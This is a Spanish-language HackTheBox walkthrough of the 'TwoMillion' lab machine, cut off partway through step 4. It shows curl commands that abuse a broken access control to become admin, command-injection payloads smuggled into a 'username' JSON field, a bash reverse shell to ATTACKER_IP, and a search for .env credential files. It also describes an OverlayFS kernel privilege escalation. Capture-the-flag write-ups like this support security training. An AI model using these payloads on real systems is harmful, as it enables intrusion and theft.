HackTheBox Linux Medium CVE-2023-0386

Máquina TwoMillion

Homenaje al hito de dos millones de usuarios en HackTheBox. La máquina recrea la antigua plataforma HTB con un proceso de invitación oculto basado en ROT13 y Base64, una API vulnerable a Broken Access Control que permite escalar a administrador, inyección de comandos para obtener shell, y escalada de privilegios mediante CVE-2023-0386, una vulnerabilidad crítica en el kernel Linux que afecta el subsistema OverlayFS.

Escenario

TwoMillion es una máquina especial lanzada para celebrar los 2 millones de usuarios en HackTheBox. Reproduce la interfaz original de la plataforma con su característico proceso de invitación. El objetivo implica reverse engineering de JavaScript ofuscado (ROT13 + Base64), registrarse mediante el código generado, explotar un Broken Access Control en la API v1 para obtener privilegios de administrador, y desde allí ejecutar comandos vía inyección. La escalada de privilegios se consigue mediante CVE-2023-0386, una vulnerabilidad en el subsistema OverlayFS del kernel Linux que permite escalar a root mediante un exploit de escritura de SUID.

CVE-2023-0386 — OverlayFS SUID Privilege Escalation

Vulnerabilidad en el subsistema OverlayFS del kernel Linux (versiones < 6.2) que permite a un usuario sin privilegios montar un sistema de archivos overlay con archivos SUID usando capacidades de espacio de usuario. Al copiar un binario SUID a través del overlay, el kernel no elimina correctamente el bit SUID, permitiendo ejecutar código como root. Afecta a Ubuntu 22.04 con kernel 5.15.x.

Paso 1 — Registro y acceso a la API:

# Registrarse con el código de invitación:
# → navegar a /register, usar código generado, crear usuario

# Autenticarse y obtener cookie de sesión:
curl -s -X POST http://2million.htb/api/v1/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@htb.local","password":"Password123!"}'

# Cookie: PHPSESSID=... (guardar para uso posterior)

Paso 2 — Broken Access Control → admin:

# Enumerar endpoints de la API v1:
curl -s http://2million.htb/api/v1 \
  -H "Cookie: PHPSESSID=..."

# Endpoint interesante: PUT /api/v1/admin/settings/update
# El endpoint acepta modificar el campo is_admin sin validar privilegios:
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=..." \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@htb.local","is_admin":1}'

# {"id":13,"username":"attacker","is_admin":1}  ← BAC exitoso

Paso 3 — Command Injection en generación de VPN:

# Endpoint admin para generar archivo VPN:
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=..." \
  -H "Content-Type: application/json" \
  -d '{"username":"test"}'

# El parámetro username se pasa sin sanitizar a exec():
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=..." \
  -H "Content-Type: application/json" \
  -d '{"username":"test;id;"}'
# uid=33(www-data) gid=33(www-data)

# Reverse shell:
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=..." \
  -H "Content-Type: application/json" \
  -d '{"username":"test;bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\";"}'

Paso 4 — Credenciales en .env → usuario admin:

find / -name ".env" 2>/dev/null
